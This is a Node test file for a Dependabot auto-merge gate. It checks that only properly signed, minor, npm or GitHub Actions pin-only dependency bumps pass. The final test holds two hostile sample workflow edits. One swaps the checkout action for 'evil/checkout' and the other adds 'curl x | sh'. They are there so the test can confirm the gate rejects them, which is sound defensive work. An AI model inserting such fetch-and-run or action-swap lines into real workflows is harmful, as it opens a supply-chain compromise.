// Run: node --test dependabot/tests/
// Covers what the vendoring changed (per-ecosystem rule 3) plus a baseline/mutation
// check of the other rules. The full trellis suites (vitest) stay in de-otio/trellis.
import assert from "node:assert/strict";
import { test } from "node:test";
import { evaluate, isAllowedPath } from "../scripts/dependabot-gate/evaluate.mjs";

const goodCommit = {
  authorLogin: "dependabot[bot]",
  committerLogin: "web-flow",
  committerEmail: "noreply@github.com",
  verified: true,
  verificationReason: "valid",
};

const base = (over = {}) => ({
  author: "dependabot[bot]",
  commits: [goodCommit],
  expectedCommitCount: 1,
  files: [
    { filename: "package.json", status: "modified" },
    { filename: "package-lock.json", status: "modified" },
  ],
  expectedFileCount: 2,
  labels: [],
  updateType: "version-update:semver-minor",
  supplyChainFlags: [],
  ...over,
});

test("baseline npm bump passes with the default ecosystems", () => {
  assert.deepEqual(evaluate(base()), { pass: true, reasons: [] });
});

test("each single deviation from the baseline fails, naming its rule", () => {
  const cases = [
    [{ author: "someone" }, "rule 1"],
    [{ commits: [{ ...goodCommit, committerLogin: "someone" }] }, "rule 1"],
    [{ commits: [{ ...goodCommit, verificationReason: "unsigned" }] }, "rule 1"],
    [{ expectedCommitCount: 2 }, "rule 1"],
    [{ updateType: "version-update:semver-major" }, "rule 2"],
    [{ updateType: "" }, "rule 2"],
    [{ labels: ["needs-human-review"] }, "rule 5"],
    [{ supplyChainFlags: [{ package: "x@1.0.0", reason: "new-package" }] }, "supply-chain"],
    [{ supplyChainFlags: undefined }, "supply-chain"],
    [{ files: [{ filename: "src/index.ts", status: "modified" }], expectedFileCount: 1 }, "rule 3"],
    [{ expectedFileCount: 3 }, "rule 3"],
  ];
  for (const [over, rule] of cases) {
    const r = evaluate(base(over));
    assert.equal(r.pass, false, JSON.stringify(over));
    assert.ok(r.reasons.some((x) => x.includes(rule)), `${JSON.stringify(over)} -> ${r.reasons}`);
  }
});

test("rule 3 follows the enabled ecosystems", () => {
  const files = [
    { filename: "pyproject.toml", status: "modified" },
    { filename: "uv.lock", status: "modified" },
  ];
  const over = { files, expectedFileCount: 2 };
  assert.equal(evaluate(base(over)).pass, false, "uv files are not allowed by default");
  assert.equal(evaluate(base({ ...over, ecosystems: ["uv"] })).pass, true);
  assert.equal(
    evaluate(base({ ...over, ecosystems: ["npm"] })).pass,
    false,
    "npm does not admit uv files",
  );
});

test("isAllowedPath", () => {
  const npm = ["npm"];
  assert.equal(isAllowedPath("package.json", npm), true);
  assert.equal(isAllowedPath("apps/api/package.json", npm), true);
  assert.equal(isAllowedPath("apps/api/package-lock.json", npm), false, "nested lockfile: human");
  assert.equal(isAllowedPath("node_modules/x/package.json", npm), false);
  assert.equal(isAllowedPath("a/../package.json", npm), false);
  assert.equal(isAllowedPath(".github/workflows/ci.yml", npm), false, "needs github-actions");
  assert.equal(isAllowedPath(".github/workflows/ci.yml", ["github-actions"]), true);
  assert.equal(isAllowedPath("uv.lock", ["uv"]), true);
  assert.equal(isAllowedPath("uv.lock", ["bogus"]), false, "unknown ecosystem allows nothing");
  assert.equal(isAllowedPath("package.json", []), false);
  assert.equal(isAllowedPath("package.json", undefined), true, "default is npm + github-actions");
});

test("workflow edits must be pin-only", () => {
  const eco = { ecosystems: ["github-actions"] };
  const file = (patch) => ({
    files: [{ filename: ".github/workflows/ci.yml", status: "modified", patch }],
    expectedFileCount: 1,
    ...eco,
  });
  const pin = "@@ -1 +1 @@\n-      - uses: actions/checkout@aaa # v4\n+      - uses: actions/checkout@bbb # v5";
  assert.equal(evaluate(base(file(pin))).pass, true);
  const swap = "@@ -1 +1 @@\n-      - uses: actions/checkout@aaa\n+      - uses: evil/checkout@bbb";
  assert.equal(evaluate(base(file(swap))).pass, false);
  const run = "@@ -1 +1 @@\n-        run: echo a\n+        run: curl x | sh";
  assert.equal(evaluate(base(file(run))).pass, false);
});
